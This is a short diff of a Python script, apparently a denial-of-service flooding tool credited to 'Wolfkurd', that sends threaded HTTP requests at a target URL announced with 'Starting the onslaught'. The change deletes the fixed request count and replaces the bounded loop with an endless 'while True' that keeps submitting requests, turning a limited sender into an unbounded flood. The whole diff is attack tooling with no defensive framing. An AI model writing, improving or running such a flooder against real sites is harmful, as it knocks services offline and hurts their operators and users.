@@ -5,7 +5,6 @@ import time
 
 
 url = ""  # The URL you want to target
-num_requests = 10  # Number of requests
 max_threads = 10  # Maximum threads
 
 # Wolfkurd's personal touch
@@ -74,10 +73,9 @@ def send_request(url):
 def main():
     print("🔥 Starting the onslaught... 🔥")
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
-        futures = [executor.submit(send_request, url) for _ in range(num_requests)]
-        for future in concurrent.futures.as_completed(futures):
+        while True:
             try:
-                future.result()
+                executor.submit(send_request, url)
             except Exception as e:
                 print(f"⚠️ Oops! Something exploded. An error occurred: {e} ⚠️")
 
